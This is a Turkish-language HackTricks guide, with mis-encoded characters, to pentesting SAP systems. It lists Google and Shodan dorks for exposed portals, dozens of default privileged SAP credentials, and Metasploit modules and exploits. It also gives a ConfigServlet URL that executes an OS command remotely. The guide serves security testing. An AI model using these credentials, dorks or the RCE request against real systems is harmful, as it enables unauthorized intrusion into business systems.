{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


# SAP HakkÄ±nda GiriÅŸ

SAP, Veri Ä°ÅŸleme Sistemleri UygulamalarÄ± ve ÃœrÃ¼nleri anlamÄ±na gelir. SAP, tanÄ±m gereÄŸi, ERP \(Kurumsal Kaynak PlanlamasÄ±\) yazÄ±lÄ±mÄ±nÄ±n yanÄ± sÄ±ra ÅŸirketin adÄ±dÄ±r.
SAP sistemi, iÅŸ yÃ¶netiminin hemen hemen her yÃ¶nÃ¼nÃ¼ kapsayan bir dizi tamamen entegre modÃ¼lden oluÅŸur.

Her SAP Ã¶rneÄŸi \(veya SID\) Ã¼Ã§ katmandan oluÅŸur: veritabanÄ±, uygulama ve sunum\), her manzara genellikle dÃ¶rt Ã¶rnekten oluÅŸur: geliÅŸtirme, test, QA ve Ã¼retim.
KatmanlarÄ±n her biri bir Ã¶lÃ§Ã¼de istismar edilebilir, ancak en etkili sonuÃ§ **veritabanasÄ±na saldÄ±rarak** elde edilebilir.

Her SAP Ã¶rneÄŸi, istemcilere ayrÄ±lmÄ±ÅŸtÄ±r. Her birinin bir kullanÄ±cÄ± SAP\* vardÄ±r, bu uygulamanÄ±n â€œrootâ€ eÅŸdeÄŸeridir.
Ä°lk oluÅŸturulma sÄ±rasÄ±nda, bu kullanÄ±cÄ± SAP\* varsayÄ±lan bir ÅŸifre alÄ±r: â€œ060719992â€ \(aÅŸaÄŸÄ±da daha fazla varsayÄ±lan ÅŸifre bulunmaktadÄ±r\).
Bu **ÅŸifrelerin test veya geliÅŸtirme ortamlarÄ±nda ne sÄ±klÄ±kla deÄŸiÅŸtirilmediÄŸini** bilseniz ÅŸaÅŸÄ±rÄ±rsÄ±nÄ±z!

KullanÄ±cÄ± adÄ± &lt;SID&gt;adm ile herhangi bir sunucunun shell'ine eriÅŸim saÄŸlamaya Ã§alÄ±ÅŸÄ±n.
Bruteforcing yardÄ±mcÄ± olabilir, ancak burada bir Hesap Kilitleme mekanizmasÄ± olabilir.

# KeÅŸif

> Sonraki bÃ¶lÃ¼m bÃ¼yÃ¼k Ã¶lÃ§Ã¼de [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures) kullanÄ±cÄ±sÄ± shipcod3'ten alÄ±nmÄ±ÅŸtÄ±r!

* Test iÃ§in Uygulama KapsamÄ±nÄ± veya Program Ã–zeti'ni kontrol edin. SAP GUI'ye baÄŸlanmak iÃ§in ana bilgisayar adlarÄ±nÄ± veya sistem Ã¶rneklerini not alÄ±n.
* Uygulama internetten eriÅŸilebilir veya kamuya aÃ§Ä±k ise dosyalarÄ±, alt alanlarÄ± ve deÄŸerli bilgileri kontrol etmek iÃ§in OSINT \(aÃ§Ä±k kaynak istihbaratÄ±\), Shodan ve Google Dorks kullanÄ±n:
```text
inurl:50000/irj/portal
inurl:IciEventService/IciEventConf
inurl:/wsnavigator/jsps/test.jsp
inurl:/irj/go/km/docs/
https://www.shodan.io/search?query=sap+portal
https://www.shodan.io/search?query=SAP+Netweaver
https://www.shodan.io/search?query=SAP+J2EE+Engine
```
* Ä°ÅŸte [http://SAP:50000/irj/portal](http://sap:50000/irj/portal) gÃ¶rÃ¼nÃ¼mÃ¼

![SAP GiriÅŸ ekranÄ±](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap%20logon.jpeg)

* AÃ§Ä±k portlarÄ± ve bilinen hizmetleri kontrol etmek iÃ§in nmap kullanÄ±n \(sap yÃ¶nlendiricileri, webdnypro, web hizmetleri, web sunucularÄ±, vb.\)
* Bir web sunucusu Ã§alÄ±ÅŸÄ±yorsa URL'leri tarayÄ±n.
* Belirli portlarda web sunucularÄ± varsa dizinleri fuzzlayÄ±n \(Burp Intruder kullanabilirsiniz\). Ä°ÅŸte varsayÄ±lan SAP ICM YollarÄ±nÄ± ve diÄŸer ilginÃ§ dizinleri veya dosyalarÄ± bulmak iÃ§in SecLists Projesi tarafÄ±ndan saÄŸlanan bazÄ± iyi kelime listeleri:

[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls\_SAP.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-SAP.txt)  
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt)  
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt)

* SAP Ã¶rneklerini/hizmetlerini/bileÅŸenlerini listelemek iÃ§in SAP SERVICE DISCOVERY yardÄ±mcÄ± Metasploit modÃ¼lÃ¼nÃ¼ kullanÄ±n:
```text
msf > use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > show options
Module options (auxiliary/scanner/sap/sap_service_discovery):
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)
RHOSTS                        yes       The target address range or CIDR identifier
THREADS      1                yes       The number of concurrent threads
TIMEOUT      1000             yes       The socket connect timeout in milliseconds
msf auxiliary(sap_service_discovery) > set rhosts 192.168.96.101
rhosts => 192.168.96.101
msf auxiliary(sap_service_discovery) > run
[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'
```
## Testing the Thick Client / SAP GUI

SAP GUI'ye baÄŸlanmak iÃ§in komut:
`sapgui <sap sunucu ana adÄ±> <sistem numarasÄ±>`

* VarsayÄ±lan kimlik bilgilerini kontrol edin \(Bugcrowdâ€™un GÃ¼venlik AÃ§Ä±ÄŸÄ± Derecelendirme Taksonomisi'nde bu P1 olarak kabul edilir -&gt; Sunucu GÃ¼venliÄŸi YanlÄ±ÅŸ YapÄ±landÄ±rmasÄ± \| VarsayÄ±lan Kimlik Bilgilerini Kullanma \| Ãœretim Sunucusu\):
```text
# SAP* - High privileges - Hardcoded kernel user
SAP*:06071992:*
SAP*:PASS:*
# IDEADM - High Privileges - Only in IDES systems
IDEADM:admin:*
# DDIC - High privileges - User has SAP_ALL
DDIC:19920706:000,001
# EARLYWATCH - High privileges
EARLYWATCH:SUPPORT:066
# TMSADM - Medium privileges
TMSADM:PASSWORD:000
TMSADM:$1Pawd2&:000
# SAPCPIC - Medium privileges
SAPCPIC:ADMIN:000,001
# SOLMAN dialog default users and passwords.
# For more info check:
# https://www.troopers.de/media/filer_public/37/34/3734ebb3-989c-4750-9d48-ea478674991a/an_easy_way_into_your_sap_systems_v30.pdf
# https://launchpad.support.sap.com/#/notes/2293011
# SOLMAN_ADMIN - High privileges - Only on SOLMAN systems
SOLMAN_ADMIN:init1234:*
# SAPSUPPORT - High privileges - Only on SOLMAN or satellite systems
SAPSUPPORT:init1234:*
# SOLMAN<SID><CLNT> - High privileges - Only on SOLMAN systems
#SOLMAN<SID><CLNT>:init1234:*
# Trial systems
# -------------
# AS ABAP 7.40 SP08 Developer Edition:
# https://blogs.sap.com/2015/10/14/sap-netweaver-as-abap-740-sp8-developer-edition-to-download-consise-installation-instruction/
DDIC:DidNPLpw2014:001
SAP*:DidNPLpw2014:001
DEVELOPER:abCd1234:001
BWDEVELOPER:abCd1234:001
# AS ABAP 7.50 SP02 Developer Edition:
# https://blogs.sap.com/2016/11/03/sap-nw-as-abap-7.50-sp2-developer-edition-to-download-consise-installation-guide/
# AS ABAP 7.51 SP02 Developer Edition:
# https://blogs.sap.com/2017/09/04/sap-as-abap-7.51-sp2-developer-edition-to-download-concise-installation-guide/
DDIC:Appl1ance:000,001
SAP*:Appl1ance:000,001
DEVELOPER:Appl1ance:001
BWDEVELOPER:Appl1ance:001
# AS ABAP 7.51 SP01 Developer Edition:
# https://blogs.sap.com/2018/09/13/as-abap-7.52-sp01-developer-edition-concise-installation-guide/
# AS ABAP 7.52 SP04 Developer Edition:
# https://blogs.sap.com/2019/10/01/as-abap-7.52-sp04-developer-edition-concise-installation-guide/
DDIC:Down1oad:000,001
SAP*:Down1oad:000,001
DEVELOPER:Down1oad:001
BWDEVELOPER:Down1oad:001
```
* Wireshark'Ä± Ã§alÄ±ÅŸtÄ±rÄ±n, ardÄ±ndan aldÄ±ÄŸÄ±nÄ±z kimlik bilgileriyle istemciye \(SAP GUI\) kimlik doÄŸrulamasÄ± yapÄ±n Ã§Ã¼nkÃ¼ bazÄ± istemciler kimlik bilgilerini SSL olmadan iletebilir. SAP DIAG protokolÃ¼ tarafÄ±ndan kullanÄ±lan ana baÅŸlÄ±klarÄ± Ã§Ã¶zÃ¼mleyebilen iki bilinen Wireshark eklentisi de vardÄ±r: SecureAuth Labs SAP Ã§Ã¶zÃ¼mleme eklentisi ve Positive Research Center tarafÄ±ndan saÄŸlanan SAP DIAG eklentisi.
* DÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± kullanÄ±cÄ±lar iÃ§in bazÄ± SAP Ä°ÅŸlem KodlarÄ±nÄ± \(tcodes\) kullanarak ayrÄ±calÄ±k yÃ¼kseltmeleri kontrol edin:
* SU01 - KullanÄ±cÄ±larÄ± oluÅŸturmak ve sÃ¼rdÃ¼rmek iÃ§in
* SU01D - KullanÄ±cÄ±larÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in
* SU10 - Toplu bakÄ±m iÃ§in
* SU02 - Profillerin manuel olarak oluÅŸturulmasÄ± iÃ§in
* SM19 - GÃ¼venlik denetimi - yapÄ±landÄ±rma
* SE84 - SAP R/3 Yetkilendirmeleri iÃ§in Bilgi Sistemi
* Ä°stemcide sistem komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±p Ã§alÄ±ÅŸtÄ±ramayacaÄŸÄ±nÄ±zÄ± kontrol edin.
* BAPI Explorer'da XSS yapÄ±p yapamayacaÄŸÄ±nÄ±zÄ± kontrol edin.

# Web arayÃ¼zÃ¼nÃ¼ test etme

* URL'leri tarayÄ±n \(keÅŸif aÅŸamasÄ±na bakÄ±n\).
* URL'leri keÅŸif aÅŸamasÄ±ndaki gibi fuzzlayÄ±n. Ä°ÅŸte [http://SAP:50000/index.html](http://sap:50000/index.html) sayfasÄ±nÄ±n gÃ¶rÃ¼nÃ¼mÃ¼:

![SAP Index Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/index.jpeg)

* YaygÄ±n web gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kontrol edin \(OWASP Top 10'a bakÄ±n\) Ã§Ã¼nkÃ¼ bazÄ± yerlerde XSS, RCE, XXE vb. gÃ¼venlik aÃ§Ä±klarÄ± bulunmaktadÄ±r.
* Web gÃ¼venlik aÃ§Ä±klarÄ±nÄ± test etmek iÃ§in Jason Haddixâ€™in [â€œThe Bug Hunters Methodologyâ€](https://github.com/jhaddix/tbhm) kaynaÄŸÄ±na gÃ¶z atÄ±n.
* Fiil ManipÃ¼lasyonu ile Kimlik DoÄŸrulama Atlatma? Belki :\)
* `http://SAP:50000/webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#` adresini aÃ§Ä±n, ardÄ±ndan â€œSeÃ§â€ butonuna tÄ±klayÄ±n ve aÃ§Ä±lan pencerede â€œAraâ€ butonuna basÄ±n. SAP kullanÄ±cÄ±larÄ±nÄ±n bir listesini gÃ¶rebilmelisiniz \(GÃ¼venlik AÃ§Ä±ÄŸÄ± ReferansÄ±: [ERPSCAN-16-010](https://erpscan.com/advisories/erpscan-16-010-sap-netweaver-7-4-information-disclosure/)\)
* Kimlik bilgileri HTTP Ã¼zerinden mi gÃ¶nderiliyor? EÄŸer Ã¶yleyse, Bugcrowdâ€™un [GÃ¼venlik AÃ§Ä±ÄŸÄ± Derecelendirme Taksonomisi](https://bugcrowd.com/vulnerability-rating-taxonomy) temelinde P3 olarak kabul edilir: KÄ±rÄ±k Kimlik DoÄŸrulama ve Oturum YÃ¶netimi \| HTTP Ãœzerinde ZayÄ±f GiriÅŸ Fonksiyonu. Ä°pucu: [http://SAP:50000/startPage](http://sap:50000/startPage) veya giriÅŸ portallarÄ±nÄ± da kontrol edin :\)

![SAP Start Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/startPage.jpeg)

* OlasÄ± dizin listeleme veya kimlik doÄŸrulama atlatma iÃ§in `/irj/go/km/navigation/` adresini deneyin.
* [http://SAP/sap/public/info](http://sap/sap/public/info) bazÄ± ilginÃ§ bilgiler iÃ§ermektedir:
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<rfc:RFC_SYSTEM_INFO.Response xmlns:rfc="urn:sap-com:document:sap:rfc:functions">
<RFCSI>
<RFCPROTO>011</RFCPROTO>
<RFCCHARTYP>4102</RFCCHARTYP>
<RFCINTTYP>BIG</RFCINTTYP>
<RFCFLOTYP>IE3</RFCFLOTYP>
<RFCDEST>randomnum</RFCDEST>
<RFCHOST>randomnum</RFCHOST>
<RFCSYSID>BRQ</RFCSYSID>
<RFCDATABS>BRQ</RFCDATABS>
<RFCDBHOST>randomnum</RFCDBHOST>
<RFCDBSYS>ORACLE</RFCDBSYS>
<RFCSAPRL>740</RFCSAPRL>
<RFCMACH>324</RFCMACH>
<RFCOPSYS>AIX</RFCOPSYS>
<RFCTZONE>-25200</RFCTZONE>
<RFCDAYST/>
<RFCIPADDR>192.168.1.8</RFCIPADDR>
<RFCKERNRL>749</RFCKERNRL>
<RFCHOST2>randomnum</RFCHOST2>
<RFCSI_RESV/>
<RFCIPV6ADDR>192.168.1.8</RFCIPV6ADDR>
</RFCSI>
</rfc:RFC_SYSTEM_INFO.Response>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
# Configuration Parameters

EÄŸer pentest sÄ±rasÄ±nda doÄŸru giriÅŸ bilgilerine sahipseniz veya temel kimlik bilgileriyle SAP GUI'ye giriÅŸ yapmayÄ± baÅŸardÄ±ysanÄ±z, parametre deÄŸerlerini kontrol edebilirsiniz. BirÃ§ok temel ve Ã¶zel yapÄ±landÄ±rma parametre deÄŸeri gÃ¼venlik aÃ§Ä±ÄŸÄ± olarak kabul edilmektedir.

Parametre deÄŸerlerini hem manuel hem de otomatik olarak, scriptler kullanarak (Ã¶rneÄŸin, [SAP Parameter Validator](https://github.com/damianStrojek/SAPPV)) kontrol edebilirsiniz.

## Manual Parameter Checking

Transaction Code `RSPFPAR`'a giderek farklÄ± parametreleri sorgulayabilir ve deÄŸerlerini Ã¶ÄŸrenebilirsiniz.

AÅŸaÄŸÄ±daki tablo, tanÄ±mlÄ± parametreleri ve ayÄ±rt edildikleri koÅŸullarÄ± iÃ§ermektedir.

Ã–rneÄŸin, eÄŸer <i>gw/reg_no_conn_info</i> 255'ten az (`<255`) olarak ayarlanmÄ±ÅŸsa, bu bir tehdit olarak kabul edilmelidir. Benzer ÅŸekilde, eÄŸer <i>icm/security_log</i> ikiye (`2`) eÅŸitse, bu da olasÄ± bir tehdit olacaktÄ±r.

| Parameter                                      | Constraint  | Description                                    |
|------------------------------------------------|-------------|------------------------------------------------|
| `auth/object_disabling_active`                 | `Y`         | Nesne devre dÄ±ÅŸÄ± bÄ±rakmanÄ±n aktif olup olmadÄ±ÄŸÄ±nÄ± gÃ¶sterir.       |
| `auth/rfc_authority_check`                     | `<2`        | RFC'ler iÃ§in yetki kontrol seviyesini ayarlar.       |
| `auth/no_check_in_some_cases`                  | `Y`         | BazÄ± durumlarda kontrollerin atlanÄ±p atlanmadÄ±ÄŸÄ±nÄ± belirtir. |
| `bdc/bdel_auth_check`                         | `FALSE`     | BDC'de yetkilendirme kontrollerinin uygulanÄ±p uygulanmadÄ±ÄŸÄ±nÄ± belirler. |
| `gw/reg_no_conn_info`                         | `<255`      | KayÄ±t numarasÄ± baÄŸlantÄ± bilgisi iÃ§in karakter sayÄ±sÄ±nÄ± sÄ±nÄ±rlar. |
| `icm/security_log`                            | `2`         | ICM (Internet Communication Manager) iÃ§in gÃ¼venlik gÃ¼nlÃ¼k seviyesi tanÄ±mlar. |
| `icm/server_port_0`                           | `Display`   | ICM iÃ§in sunucu portunu belirtir (port 0).    |
| `icm/server_port_1`                           | `Display`   | ICM iÃ§in sunucu portunu belirtir (port 1).    |
| `icm/server_port_2`                           | `Display`   | ICM iÃ§in sunucu portunu belirtir (port 2).    |
| `login/password_compliance_to_current_policy`  | `0`         | Åifrelerin mevcut politikaya uyumunu zorunlu kÄ±lar. |
| `login/no_automatic_user_sapstar`              | `0`         | Otomatik kullanÄ±cÄ± SAPSTAR atamasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r.   |
| `login/min_password_specials`                  | `0`         | Åifrelerde gereken minimum Ã¶zel karakter sayÄ±sÄ±. |
| `login/min_password_lng`                       | `<8`        | Åifreler iÃ§in gereken minimum uzunluk.        |
| `login/min_password_lowercase`                 | `0`         | Åifrelerde gereken minimum kÃ¼Ã§Ã¼k harf sayÄ±sÄ±. |
| `login/min_password_uppercase`                 | `0`         | Åifrelerde gereken minimum bÃ¼yÃ¼k harf sayÄ±sÄ±. |
| `login/min_password_digits`                    | `0`         | Åifrelerde gereken minimum rakam sayÄ±sÄ±. |
| `login/min_password_letters`                   | `1`         | Åifrelerde gereken minimum harf sayÄ±sÄ±. |
| `login/fails_to_user_lock`                     | `<5`        | KullanÄ±cÄ± hesabÄ±nÄ±n kilitlenmeden Ã¶nceki baÅŸarÄ±sÄ±z giriÅŸ denemesi sayÄ±sÄ±. |
| `login/password_expiration_time`               | `>90`       | Åifre geÃ§erlilik sÃ¼resi (gÃ¼n).             |
| `login/password_max_idle_initial`              | `<14`       | Åifre yeniden giriÅŸi gerektirmeden Ã¶nceki maksimum boÅŸta kalma sÃ¼resi (ilk). |
| `login/password_max_idle_productive`           | `<180`      | Åifre yeniden giriÅŸi gerektirmeden Ã¶nceki maksimum boÅŸta kalma sÃ¼resi (Ã¼retken). |
| `login/password_downwards_compatibility`       | `0`         | Åifreler iÃ§in aÅŸaÄŸÄ±ya uyumluluÄŸun etkin olup olmadÄ±ÄŸÄ±nÄ± belirtir. |
| `rfc/reject_expired_passwd`                    | `0`         | SÃ¼resi dolmuÅŸ ÅŸifrelerin RFC (Remote Function Calls) iÃ§in reddedilip reddedilmeyeceÄŸini belirler. |
| `rsau/enable`                                 | `0`         | RS AU (Authorization) kontrollerini etkinleÅŸtirir veya devre dÄ±ÅŸÄ± bÄ±rakÄ±r. |
| `rdisp/gui_auto_logout`                       | `<5`        | GUI oturumlarÄ±nÄ±n otomatik Ã§Ä±kÄ±ÅŸÄ± iÃ§in sÃ¼reyi belirtir (dakika). |
| `service/protectedwebmethods`                  | `SDEFAULT`  | Korunan web yÃ¶ntemleri iÃ§in varsayÄ±lan ayarlarÄ± belirtir. |
| `snc/enable`                                  | `0`         | GÃ¼venli AÄŸ Ä°letiÅŸimi (SNC) etkinleÅŸtirir veya devre dÄ±ÅŸÄ± bÄ±rakÄ±r. |
| `ucon/rfc/active`                             | `0`         | UCON (Unified Connectivity) RFC'lerini etkinleÅŸtirir veya devre dÄ±ÅŸÄ± bÄ±rakÄ±r. |

## Script for Parameter Checking

Parametre sayÄ±sÄ± nedeniyle, tÃ¼m parametreleri bir .XML dosyasÄ±na aktarmak ve yukarÄ±da belirtilen tÃ¼m parametreleri kontrol edip deÄŸerlerini uygun ÅŸekilde yazdÄ±racak olan [SAPPV (SAP Parameter Validator)](https://github.com/damianStrojek/SAPPV) scriptini kullanmak da mÃ¼mkÃ¼ndÃ¼r.
```
./SAPPV.sh EXPORT.XML

Parameter: auth/no_check_in_some_cases
User-Defined Value: No data
System Default Value: Y
Comment: Activation of the Profile Generator
Vulnerability: "SAP Parameter Misconfiguration: auth/no_check_in_some_cases"

Parameter: auth/object_disabling_active
User-Defined Value: N
System Default Value: N
Comment: Value 'N' prohibits disabling of authorization objects
Vulnerability: "SAP Parameter Misconfiguration: auth/object_disabling_active"

Parameter: auth/rfc_authority_check
User-Defined Value: 6
System Default Value: 6
Comment: Execution option for the RFC authority check
Vulnerability: "SAP Parameter Misconfiguration: auth/rfc_authority_check"

Parameter: bdc/bdel_auth_check
User-Defined Value: No data
System Default Value: FALSE
Comment: batch-input: check authorisation for activity DELE when delete TA
Vulnerability: "SAP Parameter Misconfiguration: bdc/bdel_auth_check"

[...]
```
# SaldÄ±rÄ±!

* Eski sunucularda veya Windows 2000 gibi teknolojilerde Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± kontrol edin.
* OlasÄ± istismarlarÄ± / saldÄ±rÄ±larÄ± planlayÄ±n, SAP keÅŸfi iÃ§in birÃ§ok Metasploit modÃ¼lÃ¼ \(yardÄ±mcÄ± modÃ¼ller\) ve istismar bulunmaktadÄ±r:
```text
msf > search sap
Matching Modules
================
Name                                                                     Disclosure Date  Rank       Description
----                                                                     ---------------  ----       -----------
auxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection
auxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution
auxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute
auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion
auxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS
auxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
auxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration
auxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection
auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management
auxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure
auxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering
auxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner
auxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure
auxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force
auxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users
auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points
auxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment
auxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile
auxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList
auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters
auxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties
auxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles
auxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile
auxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection
auxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request
auxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner
auxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery
auxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse
auxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
auxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery
auxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data
auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution
auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE
auxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering
auxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure
auxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer
exploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution
exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
exploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download
exploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow
exploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
exploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution
exploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection
exploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow
exploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow
exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow
```
* Bilinen aÃ§Ä±klarÄ± kullanmaya Ã§alÄ±ÅŸÄ±n \(Exploit-DB'ye gÃ¶z atÄ±n\) veya SAP Portal'daki eski ama iyi â€œSAP ConfigServlet Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rmaâ€ gibi saldÄ±rÄ±lar:
```text
http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
```
![SAP Config Servlet RCE](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap_rce.jpeg)

